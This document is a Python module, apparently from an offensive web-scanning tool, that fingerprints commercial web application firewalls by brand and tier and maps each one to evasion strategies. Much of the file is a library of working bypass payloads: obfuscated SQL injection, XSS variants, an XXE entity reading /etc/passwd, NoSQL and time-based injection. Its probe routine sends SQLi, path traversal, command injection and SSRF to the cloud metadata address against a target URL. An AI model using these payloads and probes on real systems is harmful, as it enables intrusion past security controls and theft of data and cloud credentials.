"""WAF Fingerprinting — identify exact WAF version, configuration, and bypass strategy.

This module goes beyond simple signature detection to:
1. Identify exact WAF version (not just brand)
2. Classify WAF tier (free, enterprise, custom)
3. Map WAF rules and bypass strategies
4. Learn from observed blocks
5. Generate adaptive bypass payloads
"""

from __future__ import annotations

import asyncio
import json
import re
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple


@dataclass
class WAFFingerprint:
    """Detailed WAF fingerprint."""
    name: str
    version: Optional[str] = None
    tier: Optional[str] = None  # free, enterprise, custom
    rules: List[str] = field(default_factory=list)
    bypass_strategies: List[str] = field(default_factory=list)
    blocked_patterns: List[str] = field(default_factory=list)
    successful_bypasses: List[str] = field(default_factory=list)
    confidence: float = 0.0
    detection_method: str = ""
    scan_count: int = 0
    block_rate: float = 0.0


class WAFFingerprinter:
    """Deep WAF fingerprinting and bypass strategy generation."""

    # ── WAF Signature Databases ─────────────────────────────────────────

    WAF_SIGNATURES = {
        "cloudflare": {
            "headers": {
                "cf-ray": {"pattern": r"cf-ray", "version": None},
                "cf-cache-status": {"pattern": r"cf-cache-status", "version": None},
                "cf-connecting-ip": {"pattern": r"cf-connecting-ip", "version": None},
                "cf-visitor": {"pattern": r"cf-visitor", "version": None},
                "cdn-loop": {"pattern": r"cdn-loop", "version": None},
            },
            "body": {
                "checking your browser": {"pattern": r"checking your browser", "version": None},
                "ray id": {"pattern": r"ray id:", "version": None},
                "attention required": {"pattern": r"attention required.*cloudflare", "version": None},
                "just a moment": {"pattern": r"just a moment", "version": None},
                "cloudflare": {"pattern": r"cloudflare", "version": None},
            },
            "status_codes": [403, 503],
            "tiers": {
                "free": {"headers": ["cf-ray"], "body": ["checking your browser"]},
                "pro": {"headers": ["cf-ray", "cf-cache-status"], "body": ["checking your browser", "ray id"]},
                "business": {"headers": ["cf-ray", "cf-cache-status", "cdn-loop"], "body": ["checking your browser", "ray id", "challenge-platform"]},
                "enterprise": {"headers": ["cf-ray", "cf-cache-status", "cdn-loop", "cf-connecting-ip"], "body": ["checking your browser", "ray id", "challenge-platform", "managed challenge"]},
            },
        },
        "akamai": {
            "headers": {
                "akamai": {"pattern": r"akamai", "version": None},
                "x-akamai-transformed": {"pattern": r"x-akamai-transformed", "version": None},
                "x-akamai-request-id": {"pattern": r"x-akamai-request-id", "version": None},
                "akamai-origin-hop": {"pattern": r"akamai-origin-hop", "version": None},
            },
            "body": {
                "access denied": {"pattern": r"access denied", "version": None},
                "akamaighost": {"pattern": r"akamaighost", "version": None},
                "reference #[a-z0-9]+": {"pattern": r"reference #[a-z0-9]+", "version": None},
            },
            "status_codes": [403, 406],
        },
        "aws_waf": {
            "headers": {
                "awswaf": {"pattern": r"awswaf", "version": None},
                "x-amzn-requestid": {"pattern": r"x-amzn-requestid", "version": None},
                "x-amzn-trace-id": {"pattern": r"x-amzn-trace-id", "version": None},
                "x-amzn-waf-action": {"pattern": r"x-amzn-waf-action", "version": None},
            },
            "body": {
                "403 forbidden": {"pattern": r"403 forbidden", "version": None},
                "request blocked": {"pattern": r"request blocked by aws waf", "version": None},
                "aws waf": {"pattern": r"aws waf", "version": None},
            },
            "status_codes": [403],
        },
        "imperva": {
            "headers": {
                "x-cdn": {"pattern": r"x-cdn.*imperva", "version": None},
                "incap-ses": {"pattern": r"incap-ses", "version": None},
                "visid_incap": {"pattern": r"visid_incap", "version": None},
                "x-iinfo": {"pattern": r"x-iinfo", "version": None},
            },
            "body": {
                "incapsula": {"pattern": r"incapsula", "version": None},
                "incident id": {"pattern": r"incident id", "version": None},
                "powered by imperva": {"pattern": r"powered by imperva", "version": None},
            },
            "status_codes": [403],
        },
        "mod_security": {
            "headers": {
                "mod_security": {"pattern": r"mod_security", "version": None},
                "modsecurity": {"pattern": r"modsecurity", "version": None},
            },
            "body": {
                "mod_security": {"pattern": r"mod_security", "version": None},
                "not acceptable": {"pattern": r"not acceptable", "version": None},
                "modsecurity action": {"pattern": r"modsecurity action", "version": None},
            },
            "status_codes": [403, 406],
        },
        "cloudflare_bot_management": {
            "headers": {
                "cf-ray": {"pattern": r"cf-ray", "version": None},
                "cf-bot-management": {"pattern": r"cf-bot-management", "version": None},
            },
            "body": {
                "checking your browser": {"pattern": r"checking your browser", "version": None},
                "managed challenge": {"pattern": r"managed challenge", "version": None},
                "bot management": {"pattern": r"bot management", "version": None},
            },
            "status_codes": [403, 503],
        },
    }

    # ── WAF Bypass Strategy Databases ───────────────────────────────────

    BYPASS_STRATEGIES = {
        "cloudflare": {
            "free": [
                "unicode_normalization",
                "case_variation",
                "comment_insertion",
                "whitespace_variation",
                "null_byte",
                "double_encoding",
            ],
            "pro": [
                "unicode_normalization",
                "case_variation",
                "comment_insertion",
                "whitespace_variation",
                "null_byte",
                "double_encoding",
                "chunked_transfer",
                "http_parameter_pollution",
            ],
            "business": [
                "unicode_normalization",
                "case_variation",
                "comment_insertion",
                "whitespace_variation",
                "null_byte",
                "double_encoding",
                "chunked_transfer",
                "http_parameter_pollution",
                "json_injection",
                "xml_injection",
            ],
            "enterprise": [
                "unicode_normalization",
                "case_variation",
                "comment_insertion",
                "whitespace_variation",
                "null_byte",
                "double_encoding",
                "chunked_transfer",
                "http_parameter_pollution",
                "json_injection",
                "xml_injection",
                "time_based_evasion",
                "resource_exhaustion",
            ],
        },
        "akamai": {
            "default": [
                "unicode_normalization",
                "case_variation",
                "comment_insertion",
                "double_encoding",
                "chunked_transfer",
                "http_parameter_pollution",
            ],
        },
        "aws_waf": {
            "default": [
                "unicode_normalization",
                "case_variation",
                "comment_insertion",
                "whitespace_variation",
                "double_encoding",
            ],
        },
        "imperva": {
            "default": [
                "unicode_normalization",
                "case_variation",
                "comment_insertion",
                "double_encoding",
                "chunked_transfer",
            ],
        },
        "mod_security": {
            "default": [
                "unicode_normalization",
                "case_variation",
                "comment_insertion",
                "whitespace_variation",
                "null_byte",
                "double_encoding",
            ],
        },
    }

    # ── Bypass Payload Templates ────────────────────────────────────────

    BYPASS_PAYLOAD_TEMPLATES = {
        "unicode_normalization": {
            "sqli": [
                "' UNI\u004fN SELECT NULL--",
                "' un\u0069on select null--",
                "' \u0055NION \u0053ELECT NULL--",
            ],
            "xss": [
                "<scr\u0069pt>alert(1)</scr\u0069pt>",
                "<img src=x onerr\u006fr=alert(1)>",
                "j\u0061vascript:alert(1)",
            ],
        },
        "case_variation": {
            "sqli": [
                "' UnIoN SeLeCt NuLl--",
                "' UNION SELECT NULL--",
                "' union select null--",
            ],
            "xss": [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<IMG SRC=x ONERROR=alert(1)>",
                "JaVaScRiPt:alert(1)",
            ],
        },
        "comment_insertion": {
            "sqli": [
                "'/**/UNION/**/SELECT/**/NULL--",
                "'/*!50000UNION*/ SELECT NULL--",
                "'UN/**/ION SEL/**/ECT NULL--",
            ],
            "xss": [
                "<scr/**/ipt>alert(1)</scr/**/ipt>",
                "<img/src=x/onerror=alert(1)>",
                "java/**/script:alert(1)",
            ],
        },
        "whitespace_variation": {
            "sqli": [
                "'%09UNION%09SELECT%09NULL--",
                "'%0aUNION%0aSELECT%0aNULL--",
                "'%0dUNION%0dSELECT%0dNULL--",
            ],
            "xss": [
                "<script%09>alert(1)</script>",
                "<img%09src=x%09onerror=alert(1)>",
                "java%09script:alert(1)",
            ],
        },
        "null_byte": {
            "sqli": [
                "'%00UNION SELECT NULL--",
                "'%00' OR '1'='1",
            ],
            "xss": [
                "<script%00>alert(1)</script>",
                "java%00script:alert(1)",
            ],
        },
        "double_encoding": {
            "sqli": [
                "%2527%2520UNION%2520SELECT%2520NULL--",
                "%2527%2520OR%2520%25271%2527%3D%25271",
            ],
            "xss": [
                "%253Cscript%253Ealert(1)%253C/script%253E",
                "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
            ],
        },
        "chunked_transfer": {
            "sqli": [
                "Transfer-Encoding: chunked\r\n\r\n6\r\n' OR 1\r\n0\r\n\r\n",
            ],
        },
        "http_parameter_pollution": {
            "sqli": [
                "' OR '1'='1'&param=' OR '1'='2",
            ],
        },
        "json_injection": {
            "sqli": [
                '{"param": "\' OR 1=1--"}',
                '{"$ne": ""}',
            ],
        },
        "xml_injection": {
            "xss": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
        },
        "time_based_evasion": {
            "sqli": [
                "' AND SLEEP(3)--",
                "' AND BENCHMARK(5000000,MD5('a'))--",
            ],
        },
        "resource_exhaustion": {
            "sqli": [
                "' UNION SELECT NULL FROM generate_series(1,10000)--",
            ],
        },
    }

    def __init__(self):
        self.fingerprints: Dict[str, WAFFingerprint] = {}
        self._scan_history: List[Dict[str, Any]] = []

    async def fingerprint_waf(
        self,
        target_url: str,
        response_func,
    ) -> WAFFingerprint:
        """Fingerprint the WAF on a target."""
        # Send probe requests to identify WAF
        probe_results = await self._send_probes(target_url, response_func)

        # Analyze results
        fingerprint = self._analyze_probes(probe_results)

        # Classify tier
        if fingerprint.name in self.WAF_SIGNATURES:
            fingerprint.tier = self._classify_tier(fingerprint, probe_results)

            # Get bypass strategies for this tier
            strategies = self.BYPASS_STRATEGIES.get(fingerprint.name, {})
            if fingerprint.tier and fingerprint.tier in strategies:
                fingerprint.bypass_strategies = strategies[fingerprint.tier]
            elif "default" in strategies:
                fingerprint.bypass_strategies = strategies["default"]

        # Store fingerprint
        self.fingerprints[target_url] = fingerprint

        return fingerprint

    async def _send_probes(
        self,
        target_url: str,
        response_func,
    ) -> List[Dict[str, Any]]:
        """Send probe requests to identify WAF."""
        probes = []

        # SQL injection probe
        sql_probe = {
            "name": "sqli_probe",
            "payload": "' OR '1'='1",
            "headers": {"User-Agent": "Mozilla/5.0"},
        }

        # XSS probe
        xss_probe = {
            "name": "xss_probe",
            "payload": "<script>alert(1)</script>",
            "headers": {"User-Agent": "Mozilla/5.0"},
        }

        # Path traversal probe
        traversal_probe = {
            "name": "traversal_probe",
            "payload": "../../../etc/passwd",
            "headers": {"User-Agent": "Mozilla/5.0"},
        }

        # Command injection probe
        cmd_probe = {
            "name": "cmd_probe",
            "payload": "; echo TITAN_FINGERPRINT",
            "headers": {"User-Agent": "Mozilla/5.0"},
        }

        # SSRF probe
        ssrf_probe = {
            "name": "ssrf_probe",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "headers": {"User-Agent": "Mozilla/5.0"},
        }

        for probe in [sql_probe, xss_probe, traversal_probe, cmd_probe, ssrf_probe]:
            try:
                response = await response_func(target_url, probe["payload"], probe["headers"])
                probes.append({
                    "probe": probe["name"],
                    "payload": probe["payload"],
                    "status": response.get("status", 0),
                    "body": response.get("body", ""),
                    "headers": response.get("headers", {}),
                })
            except Exception:
                continue

        return probes

    def _analyze_probes(self, probes: List[Dict[str, Any]]) -> WAFFingerprint:
        """Analyze probe results to identify WAF."""
        fingerprint = WAFFingerprint(name="unknown")

        for probe in probes:
            headers = probe.get("headers", {})
            body = probe.get("body", "")
            status = probe.get("status", 0)

            # Check each WAF signature
            for waf_name, signatures in self.WAF_SIGNATURES.items():
                # Check headers
                for header_name, header_sig in signatures.get("headers", {}).items():
                    for hk, hv in headers.items():
                        if re.search(header_sig["pattern"], f"{hk}: {hv}", re.IGNORECASE):
                            fingerprint.name = waf_name
                            fingerprint.detection_method = f"header:{header_name}"
                            fingerprint.confidence = 0.9

                # Check body
                for body_name, body_sig in signatures.get("body", {}).items():
                    if re.search(body_sig["pattern"], body, re.IGNORECASE):
                        fingerprint.name = waf_name
                        fingerprint.detection_method = f"body:{body_name}"
                        fingerprint.confidence = 0.95

                # Check status codes
                if status in signatures.get("status_codes", []):
                    if fingerprint.name == "unknown":
                        fingerprint.name = waf_name
                        fingerprint.detection_method = f"status:{status}"
                        fingerprint.confidence = 0.7

        return fingerprint

    def _classify_tier(
        self,
        fingerprint: WAFFingerprint,
        probes: List[Dict[str, Any]],
    ) -> Optional[str]:
        """Classify WAF tier based on response patterns."""
        if fingerprint.name not in self.WAF_SIGNATURES:
            return None

        waf_sigs = self.WAF_SIGNATURES[fingerprint.name]
        tiers = waf_sigs.get("tiers", {})

        if not tiers:
            return "default"

        # Check response patterns against tier signatures
        for probe in probes:
            headers = probe.get("headers", {})
            body = probe.get("body", "")

            for tier_name, tier_sigs in tiers.items():
                header_match = all(
                    any(re.search(sig, f"{hk}: {hv}", re.IGNORECASE)
                        for hk, hv in headers.items())
                    for sig in tier_sigs.get("headers", [])
                )
                body_match = all(
                    any(re.search(sig, body, re.IGNORECASE) for _ in [1])
                    for sig in tier_sigs.get("body", [])
                )

                if header_match and body_match:
                    return tier_name

        return "default"

    def get_bypass_payloads(
        self,
        waf_name: str,
        attack_type: str,
        tier: Optional[str] = None,
    ) -> List[str]:
        """Get bypass payloads for a specific WAF and attack type."""
        payloads = []

        # Get strategies for this WAF/tier
        strategies = self.BYPASS_STRATEGIES.get(waf_name, {})
        if tier and tier in strategies:
            strategy_list = strategies[tier]
        elif "default" in strategies:
            strategy_list = strategies["default"]
        else:
            return payloads

        # Generate payloads for each strategy
        for strategy in strategy_list:
            templates = self.BYPASS_PAYLOAD_TEMPLATES.get(strategy, {})
            if attack_type in templates:
                payloads.extend(templates[attack_type])

        return payloads

    def update_from_scan(
        self,
        waf_name: str,
        blocked_patterns: List[str],
        successful_bypasses: List[str],
    ) -> None:
        """Update WAF profile from scan results."""
        if waf_name not in self.fingerprints:
            self.fingerprints[waf_name] = WAFFingerprint(name=waf_name)

        fingerprint = self.fingerprints[waf_name]
        fingerprint.scan_count += 1
        fingerprint.blocked_patterns.extend(blocked_patterns)
        fingerprint.successful_bypasses.extend(successful_bypasses)

        # Update block rate
        total = len(fingerprint.blocked_patterns) + len(fingerprint.successful_bypasses)
        if total > 0:
            fingerprint.block_rate = len(fingerprint.blocked_patterns) / total

        # Trim to last 100 entries
        if len(fingerprint.blocked_patterns) > 100:
            fingerprint.blocked_patterns = fingerprint.blocked_patterns[-100:]
        if len(fingerprint.successful_bypasses) > 100:
            fingerprint.successful_bypasses = fingerprint.successful_bypasses[-100:]

    def get_fingerprint(self, target_url: str) -> Optional[WAFFingerprint]:
        """Get WAF fingerprint for a target."""
        return self.fingerprints.get(target_url)
